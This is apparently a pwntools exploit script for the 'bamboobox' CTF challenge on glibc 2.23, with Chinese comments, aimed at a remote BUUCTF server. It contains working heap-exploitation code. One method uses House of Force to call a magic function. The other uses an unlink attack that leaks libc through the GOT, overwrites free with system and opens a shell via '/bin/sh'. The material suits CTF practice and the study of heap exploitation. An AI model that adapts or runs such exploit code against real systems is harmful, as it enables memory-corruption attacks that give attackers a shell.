from pwn import *
from zio import l64
# glibc 2.23 heap exploit
# 可以无限制堆溢出
# 有个magic函数直接get flag，那就没意思了呀，尝试一下get shell吧
context.arch = "amd64"
context.log_level=logging.DEBUG
context.terminal=['tmux','splitw','-v']
ld_path = './ld-2.23.so'
libc_path = './libc-2.23.so'

if args.LOCAL:
    p = process([ld_path, './bamboobox'], env={'LD_PRELOAD': libc_path})
    # gdb.attach(p)
else:
    p = remote('node4.buuoj.cn', 29241)

def choose(command):
    p.recvuntil(b'Your choice:')
    p.sendline(str(command).encode())

def show():
    choose(1)

def add(size, content):
    '''
    atoi(), 所以size可以传负数，可以实现top chunk的上移
    '''
    choose(2)
    p.recvuntil(b'Please enter the length of item name:')
    p.sendline(str(size).encode())
    p.recvuntil(b'Please enter the name of item:')
    p.send(content)

def change(index, size, content):
    choose(3)
    p.recvuntil(b'Please enter the index of item:')
    p.sendline(str(index).encode())
    p.recvuntil(b'Please enter the length of item name:')
    p.sendline(str(size).encode())
    p.recvuntil(b'Please enter the new name of the item:')
    p.send(content) 

def remove(index):
    choose(4)
    p.recvuntil(b'Please enter the index of item:')
    p.sendline(str(index).encode())

e = ELF('./bamboobox')
libc = ELF('/home/leo/ctfs/ctfoj/BUUCTF/Pwn/hitcon2014_stkof/libc.so.6')
if args.LOCAL:
    libc = ELF('./libc-2.23.so')
one_gadget = 0x4526a
itemlist = 0x6020c0

# 解法1：House of Force，执行magic
def hof():
    add(0x60, b'a')
    change(0, 0x70, b'a'*0x68 + l64(-1))
    # 想想，负数在进行 size 转化的时候，是需要加的，所以这里需要减
    add(-0x90-0x10, b'a')
    add(0x10, b'a'*8 + p64(e.sym['magic']))
    choose(5)

# 解法2：unlink get shell
def unlink():
    # add(0x40, b'a') # 0
    add(0x20, b'a') # 0
    add(0x80, b'a') # 1
    add(0x10, b'a') # 2
    add(0x10, b'a') # 3
    add(0x10, b'/bin/sh\x00') # 4

    fd = itemlist+8 - 0x18
    bk = itemlist+8 - 0x10

    # fake_chunk = p64(0)
    # fake_chunk = p8(0)*0x10
    # fake_chunk = p64(0) + p64(0x31)
    # fake_chunk += p64(fd) + p64(bk)
    # fake_chunk += p8(0)*0x10
    # fake_chunk += p64(0x30) + p64(0x90)

    fake_chunk = p64(0) + p64(0x21)
    fake_chunk += p64(fd) + p64(bk)
    fake_chunk += p64(0x20) + p64(0x90)

    # gdb.attach(p)
    change(0, len(fake_chunk), fake_chunk)

    remove(1) # unlink
    # gdb.attach(p)
    change(0, 0x20, p8(0)*0x10 + p64(0x30) + p64(e.got['free']))
    show()
    free_addr = u64(p.recvuntil(b'\x7f')[-6:] + b'\x00'*2)
    libc_base = free_addr - libc.sym['free']
    system_addr = libc_base + libc.sym['system']
    p.success(f"libc_base: {hex(libc_base)}\nsystem_addr: {hex(system_addr)}")
    change(0, 8, p64(system_addr))
    remove(4)
    
unlink()

p.interactive()
